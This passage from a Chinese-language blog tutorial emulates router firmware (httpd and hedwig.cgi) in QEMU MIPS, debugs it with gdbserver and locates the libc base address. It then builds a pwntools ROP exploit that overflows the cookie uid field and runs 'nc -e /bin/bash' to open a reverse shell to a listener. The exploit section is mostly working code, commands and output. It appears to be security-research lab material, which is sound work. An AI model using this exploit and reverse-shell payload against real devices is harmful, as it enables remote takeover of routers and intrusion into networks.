alt="image-20220825151722951"></p><p>查看内容后分析出<code>httpcfg.php</code>文件的作用是生成供所需服务的<code>配置文件</code>的内容，所以我们参照里面内容，自己创建一个conf作为生成的<code>配置文件</code>，填充我们所需的内容。（留个坑，暂时没搞懂）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">Umask <span class="number">026</span></span><br><span class="line">PIDFile /<span class="keyword">var</span>/run/httpd.pid</span><br><span class="line">LogGMT On  <span class="comment">#开启log</span></span><br><span class="line">ErrorLog /log <span class="comment">#log文件</span></span><br><span class="line"> </span><br><span class="line">Tuning</span><br><span class="line">&#123;</span><br><span class="line">    NumConnections <span class="number">15</span></span><br><span class="line">    BufSize <span class="number">12288</span></span><br><span class="line">    InputBufSize <span class="number">4096</span></span><br><span class="line">    ScriptBufSize <span class="number">4096</span></span><br><span class="line">    NumHeaders <span class="number">100</span></span><br><span class="line">    Timeout <span class="number">60</span></span><br><span class="line">    ScriptTimeout <span class="number">60</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Control</span><br><span class="line">&#123;</span><br><span class="line">    Types</span><br><span class="line">    &#123;</span><br><span class="line">        text/html    &#123; html htm &#125;</span><br><span class="line">        text/xml    &#123; xml &#125;</span><br><span class="line">        text/plain    &#123; txt &#125;</span><br><span class="line">        image/gif    &#123; gif &#125;</span><br><span class="line">        image/jpeg    &#123; jpg &#125;</span><br><span class="line">        text/css    &#123; css &#125;</span><br><span class="line">        application/octet-stream &#123; * &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Specials</span><br><span class="line">    &#123;</span><br><span class="line">        Dump        &#123; /dump &#125;</span><br><span class="line">        CGI            &#123; cgi &#125;</span><br><span class="line">        Imagemap    &#123; map &#125;</span><br><span class="line">        Redirect    &#123; url &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    External</span><br><span class="line">    &#123;</span><br><span class="line">        /usr/sbin/phpcgi &#123; php &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">    ServerName <span class="string">&quot;Linux, HTTP/1.1, &quot;</span></span><br><span class="line">    ServerId <span class="string">&quot;1234&quot;</span></span><br><span class="line">    Family inet</span><br><span class="line">    Interface eth0 <span class="comment">#对应qemu仿真路由器系统的网卡</span></span><br><span class="line">    Address <span class="number">192.168</span>.<span class="number">40.138</span> <span class="comment">#qemu仿真路由器系统的IP</span></span><br><span class="line">    Port <span class="string">&quot;1234&quot;</span> <span class="comment">#对应未被使用的端口</span></span><br><span class="line">    Virtual</span><br><span class="line">    &#123;</span><br><span class="line">        AnyHost</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /</span><br><span class="line">            Location /htdocs/web</span><br><span class="line">            IndexNames &#123; index.php &#125;</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/phpcgi &#123; router_info.xml &#125;</span><br><span class="line">                /usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /HNAP1</span><br><span class="line">            Location /htdocs/HNAP1</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/hnap &#123; hnap &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            IndexNames &#123; index.hnap &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用qemu-system-mipsel从系统角度进行模拟，就需要一个mips架构的内核镜像和文件系统。可以在如下网站下载：<a href="https://people.debian.org/~aurel32/qemu/">Index of &#x2F;~aurel32&#x2F;qemu</a></p><p>因为是小端，这里直接选择mipsel，然后下载其中两个文件：</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208251541021.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208251541021.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220825154155068"></p><p><strong>debian_squeeze_mipsel_standard.qcow2</strong>是文件系统，<strong>vmlinux-3.2.0-4-4kc-malta</strong>是内核镜像</p><p>启动脚本start.sh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mipsel \</span><br><span class="line">-M malta \</span><br><span class="line">-kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">-hda debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">-append &quot;root=/dev/sda1 console=tty0&quot; \</span><br><span class="line">-net nic \</span><br><span class="line">-net tap \</span><br><span class="line">-nographic \</span><br></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/kR3MmOkZ9r58ibXiafdLabavePlMptNMyKuOYIjaMGv7qPB2MUGZiaqYMuD0fFhBCMgFK4UN9XcJXwOsaicFPRNhHw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" class="lazyload" data-srcset="https://mmbiz.qpic.cn/mmbiz_png/kR3MmOkZ9r58ibXiafdLabavePlMptNMyKuOYIjaMGv7qPB2MUGZiaqYMuD0fFhBCMgFK4UN9XcJXwOsaicFPRNhHw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="图片"></p><p>输入用户名&#x2F;密码 root&#x2F;root或user&#x2F;user即可登录qemu模拟的系统</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208251612818.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208251612818.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220825161244607"></p><p>接下来在宿主机创建一个网卡，使qemu内能和宿主机通信。</p><p>安装依赖库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install bridge-utils uml-utilities</span><br></pre></td></tr></table></figure><p>在宿主机编写如下文件保存为net.sh并运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class="line">sudo iptables -F</span><br><span class="line">sudo iptables -X</span><br><span class="line">sudo iptables -t nat -F</span><br><span class="line">sudo iptables -t nat -X</span><br><span class="line">sudo iptables -t mangle -F</span><br><span class="line">sudo iptables -t mangle -X</span><br><span class="line">sudo iptables -P INPUT ACCEPT</span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -P OUTPUT ACCEPT</span><br><span class="line">sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE</span><br><span class="line">sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT</span><br><span class="line">sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">sudo ifconfig tap0 192.168.100.254 netmask 255.255.255.0</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208251623041.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208251623041.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220825162225610"></p><p>然后配置qemu虚拟系统的路由，在qemu虚拟系统中编写net.sh并运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">！/bin/sh</span></span><br><span class="line"> ifconfig eth0 192.168.100.2 netmask 255.255.255.0</span><br><span class="line">route add default gw 192.168.100.254</span><br></pre></td></tr></table></figure><p>eth0的网卡是192.168.100.2并且可以和宿主机ping通表示成功</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208251640449.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208251640449.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220825164016819"></p><p>随后使用<code>scp</code>命令将binwalk解压出来的<strong>squashfs-root</strong>文件夹上传到qemu系统中的**&#x2F;root**路径下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r squashfs-root/ root@192.168.100.2:/root</span><br></pre></td></tr></table></figure><p>然后在qemu虚拟系统中将<strong>squashfs-root</strong>文件夹下的库文件替换掉原有的，此操作会改变文件系统，如果不小心退出了虚拟系统，再次启动qemu时会失败，原因是因为改变了文件系统的内容。此时需要使用新的文件系统，因此在此操作之前可以先备份一份。编写auto.sh并执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cp sbin/httpd /</span><br><span class="line">cp -rf htdocs/ /</span><br><span class="line">rm -rf /etc/services</span><br><span class="line">cp -rf etc/ /</span><br><span class="line">cp lib/ld-uClibc-0.9.30.1.so  /lib/</span><br><span class="line">cp lib/libcrypt-0.9.30.1.so  /lib/</span><br><span class="line">cp lib/libc.so.0  /lib/</span><br><span class="line">cp lib/libgcc_s.so.1  /lib/</span><br><span class="line">cp lib/ld-uClibc.so.0  /lib/</span><br><span class="line">cp lib/libcrypt.so.0  /lib/</span><br><span class="line">cp lib/libgcc_s.so  /lib/</span><br><span class="line">cp lib/libuClibc-0.9.30.1.so  /lib/</span><br><span class="line">cd /</span><br><span class="line">ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi</span><br><span class="line">ln -s /htdocs/cgibin /usr/sbin/phpcgi</span><br></pre></td></tr></table></figure><p>接下来在qemu虚拟系统的根目录（ &#x2F; ）下，创建一个名为conf的文件，此文件是httpd服务的配置文件。内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">Umask <span class="number">026</span></span><br><span class="line">PIDFile /<span class="keyword">var</span>/run/httpd.pid</span><br><span class="line">LogGMT On  <span class="comment">#开启log</span></span><br><span class="line">ErrorLog /log <span class="comment">#log文件</span></span><br><span class="line">Tuning</span><br><span class="line">&#123;</span><br><span class="line">    NumConnections <span class="number">15</span></span><br><span class="line">    BufSize <span class="number">12288</span></span><br><span class="line">    InputBufSize <span class="number">4096</span></span><br><span class="line">    ScriptBufSize <span class="number">4096</span></span><br><span class="line">    NumHeaders <span class="number">100</span></span><br><span class="line">    Timeout <span class="number">60</span></span><br><span class="line">    ScriptTimeout <span class="number">60</span></span><br><span class="line">&#125;</span><br><span class="line">Control</span><br><span class="line">&#123;</span><br><span class="line">    Types</span><br><span class="line">    &#123;</span><br><span class="line">        text/html    &#123; html htm &#125;</span><br><span class="line">        text/xml    &#123; xml &#125;</span><br><span class="line">        text/plain    &#123; txt &#125;</span><br><span class="line">        image/gif    &#123; gif &#125;</span><br><span class="line">        image/jpeg    &#123; jpg &#125;</span><br><span class="line">        text/css    &#123; css &#125;</span><br><span class="line">        application/octet-stream &#123; * &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Specials</span><br><span class="line">    &#123;</span><br><span class="line">        Dump        &#123; /dump &#125;</span><br><span class="line">        CGI            &#123; cgi &#125;</span><br><span class="line">        Imagemap    &#123; map &#125;</span><br><span class="line">        Redirect    &#123; url &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    External</span><br><span class="line">    &#123;</span><br><span class="line">        /usr/sbin/phpcgi &#123; php &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">    ServerName <span class="string">&quot;Linux, HTTP/1.1, &quot;</span></span><br><span class="line">    ServerId <span class="string">&quot;1234&quot;</span></span><br><span class="line">    Family inet</span><br><span class="line">    Interface eth0         <span class="comment">#网卡</span></span><br><span class="line">    Address <span class="number">192.168</span>.<span class="number">100.2</span>  <span class="comment">#qemu的ip地址</span></span><br><span class="line">    Port <span class="string">&quot;4321&quot;</span>            <span class="comment">#对应web访问端口</span></span><br><span class="line">    Virtual</span><br><span class="line">    &#123;</span><br><span class="line">        AnyHost</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /</span><br><span class="line">            Location /htdocs/web</span><br><span class="line">            IndexNames &#123; index.php &#125;</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/phpcgi &#123; router_info.xml &#125;</span><br><span class="line">                /usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /HNAP1</span><br><span class="line">            Location /htdocs/HNAP1</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/hnap &#123; hnap &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            IndexNames &#123; index.hnap &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后启动httpd服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./httpd -f conf</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208251808906.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208251808906.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220825180806036"></p><p>这里访问失败是因为hedwig.cgi服务没有收到请求，需要提前配置qemu虚拟环境中的<code>REQUEST_METHOD</code>等方法，因为httpd是读取的环境变量，这里就直接通过环境变量进行设置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">export CONTENT_LENGTH=&quot;100&quot;</span><br><span class="line">export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">export REQUEST_METHOD=&quot;POST&quot;</span><br><span class="line">export REQUEST_URI=&quot;/hedwig.cgi&quot;</span><br><span class="line">export HTTP_COOKIE=&quot;uid=1234&quot;</span><br></pre></td></tr></table></figure><p>这里在qemu虚拟系统中运行hedwig.cgi，再次访问<a href="http://192.168.100.2:4321/hedwig.cgi%E5%B0%B1%E5%8F%AF%E4%BB%A5%E6%AD%A3%E5%B8%B8%E6%94%B6%E5%88%B0%E5%86%85%E5%AE%B9%E4%BA%86">http://192.168.100.2:4321/hedwig.cgi就可以正常收到内容了</a></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208251819507.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208251819507.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220825181851125"></p><p>接下来就是使用gdbserver对hedwig.cgi进行调试了。</p><h3 id="gdbserver调试"><a href="#gdbserver调试" class="headerlink" title="gdbserver调试"></a>gdbserver调试</h3><p>动态调试确定偏移但是在那之前需要关掉地址随机化，因为qemu的虚拟机内核开启了地址随机化，每次堆的地址都在变化，导致libc的基地址也不断在变，所以需要关闭地址随机化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>注：正常路由环境和 MIPS 虚拟机中为了程序运行速度会取消 canary，地址随机化等保护机制</p><p>这里需要提前将 MIPSEL 架构的 gdbserver 传到 qemu 虚拟机中，这里选择了别人编译好的 <a href="https://github.com/rapid7/embedded-tools/blob/master/binaries/gdbserver/gdbserver.mipsle">gdbserver</a></p><p>auto.shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">export CONTENT_LENGTH=&quot;100&quot;</span><br><span class="line">export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">export HTTP_COOKIE=&quot;uid=`cat content`&quot;   #content你自己构造的数据内容，原本是没有的按上面所述的方式去创建</span><br><span class="line">export REQUEST_METHOD=&quot;POST&quot;</span><br><span class="line">export REQUEST_URI=&quot;/hedwig.cgi&quot;</span><br><span class="line">echo &quot;uid=1234&quot;|./gdbserver 192.168.100.254:8888 /htdocs/web/hedwig.cgi #IP为宿主机IP</span><br></pre></td></tr></table></figure><p>宿主机连接 gdbserver</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch htdocs/cgibin</span><br><span class="line">set architecture mips</span><br><span class="line">target remote 192.168.100.2:8888 #对应qemu地址和端口</span><br></pre></td></tr></table></figure><p>这里我们终于可以看到vmmap</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208251859577.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208251859577.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220825185906544"></p><p>接下来是确定libc的基地址，需要先把环境变量配置好，不然&#x2F;htdocs&#x2F;web&#x2F;hedwig.cgi很快就执行完，进程立马就结束了，就得不到maps。</p><p>利用（注意根据会先pid规律，快速修改预测pid执行，否则maps地址数据不会出来）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/htdocs/web/hedwig.cgi &amp; cat /proc/pid/maps</span><br></pre></td></tr></table></figure><p><strong>a&amp;b 先执行a，在执行b，无论a成功与否都会执行b</strong>。因为关闭了地址随机化，libc.so.0的基地址就是0x77f34000。这里的libc.so.0是指向libuClibc-0.9.30.1.so。所以libuClibc-0.9.30.1.so基地址为0x77f34000。</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208252003073.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208252003073.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220825200305385"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">export CONTENT_LENGTH=&quot;100&quot;</span><br><span class="line">root@debian-mipsel:~# export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">root@debian-mipsel:~# export HTTP_COOKIE=&quot;uid=1234&quot;</span><br><span class="line">root@debian-mipsel:~# export REQUEST_METHOD=&quot;POST&quot;</span><br><span class="line">root@debian-mipsel:~# export REQUEST_URI=&quot;/hedwig.cgi&quot;</span><br><span class="line">root@debian-mipsel:~# /htdocs/web/hedwig.cgi &amp; cat /proc/pid/maps</span><br><span class="line">[2] 1224</span><br><span class="line">cat: /proc/pid/maps: No such file or directory</span><br><span class="line">root@debian-mipsel:~# /htdocs/web/hedwig.cgi &amp; cat /proc/1226/maps</span><br><span class="line">[3] 1226</span><br><span class="line">00400000-0041c000 r-xp 00000000 08:01 32694      /htdocs/cgibin</span><br><span class="line">0042c000-0042d000 rw-p 0001c000 08:01 32694      /htdocs/cgibin</span><br><span class="line">0042d000-0042f000 rwxp 00000000 00:00 0          [heap]</span><br><span class="line">77f34000-77f92000 r-xp 00000000 08:01 547906     /lib/libc.so.0</span><br><span class="line">77f92000-77fa1000 ---p 00000000 00:00 0 </span><br><span class="line">77fa1000-77fa2000 r--p 0005d000 08:01 547906     /lib/libc.so.0</span><br><span class="line">77fa2000-77fa3000 rw-p 0005e000 08:01 547906     /lib/libc.so.0</span><br><span class="line">77fa3000-77fa8000 rw-p 00000000 00:00 0 </span><br><span class="line">77fa8000-77fd1000 r-xp 00000000 08:01 546761     /lib/libgcc_s.so.1</span><br><span class="line">77fd1000-77fe1000 ---p 00000000 00:00 0 </span><br><span class="line">77fe1000-77fe2000 rw-p 00029000 08:01 546761     /lib/libgcc_s.so.1</span><br><span class="line">77fe2000-77fe7000 r-xp 00000000 08:01 547907     /lib/ld-uClibc.so.0</span><br><span class="line">77ff5000-77ff6000 rw-p 00000000 00:00 0 </span><br><span class="line">77ff6000-77ff7000 r--p 00004000 08:01 547907     /lib/ld-uClibc.so.0</span><br><span class="line">77ff7000-77ff8000 rw-p 00005000 08:01 547907     /lib/ld-uClibc.so.0</span><br><span class="line">7ffd6000-7fff7000 rwxp 00000000 00:00 0          [stack]</span><br><span class="line">7fff7000-7fff8000 r-xp 00000000 00:00 0          [vdso]</span><br></pre></td></tr></table></figure><p>编写exp（注意是py2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2</span><br><span class="line">from pwn import *</span><br><span class="line">context.endian = &quot;little&quot;</span><br><span class="line">context.arch = &quot;mips&quot;</span><br><span class="line">base_addr = 0x77f34000</span><br><span class="line">system_addr_1 = 0x53200-1</span><br><span class="line">gadget1 = 0x45988</span><br><span class="line">gadget2 = 0x159cc</span><br><span class="line"> </span><br><span class="line">cmd = &#x27;nc -e /bin/bash 192.168.100.254 9999&#x27;</span><br><span class="line">padding = &#x27;A&#x27; * 973 #1009-4*9</span><br><span class="line">padding += p32(base_addr + system_addr_1) # s0</span><br><span class="line">padding += p32(base_addr + gadget2)       # s1</span><br><span class="line">padding += &#x27;A&#x27; * 4                        # s2</span><br><span class="line">padding += &#x27;A&#x27; * 4                        # s3</span><br><span class="line">padding += &#x27;A&#x27; * 4                        # s4</span><br><span class="line">padding += &#x27;A&#x27; * 4                           # s5</span><br><span class="line">padding += &#x27;A&#x27; * 4                        # s6</span><br><span class="line">padding += &#x27;A&#x27; * 4                        # s7</span><br><span class="line">padding += &#x27;A&#x27; * 4                        # fp</span><br><span class="line">padding += p32(base_addr + gadget1)       # ra</span><br><span class="line">padding += &#x27;B&#x27; * 0x10</span><br><span class="line">padding += cmd</span><br><span class="line"> </span><br><span class="line">f = open(&quot;context&quot;,&#x27;wb&#x27;)</span><br><span class="line">f.write(padding)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>生成的context通过scp拷贝到mips虚拟机<del>目录中并且在</del>目录下创造debug.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">export CONTENT_LENGTH=&quot;100&quot;</span><br><span class="line">export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">export HTTP_COOKIE=&quot;uid=`cat context`&quot;</span><br><span class="line">export REQUEST_METHOD=&quot;POST&quot;</span><br><span class="line">export REQUEST_URI=&quot;/hedwig.cgi&quot;</span><br><span class="line">echo &quot;uid=1234&quot;|/htdocs/web/hedwig.cgi</span><br></pre></td></tr></table></figure><p>在宿主机运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vlp 9999</span><br></pre></td></tr></table></figure><p>然后再mips虚拟机执行debug.sh</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208252019918.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208252019918.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>getshell 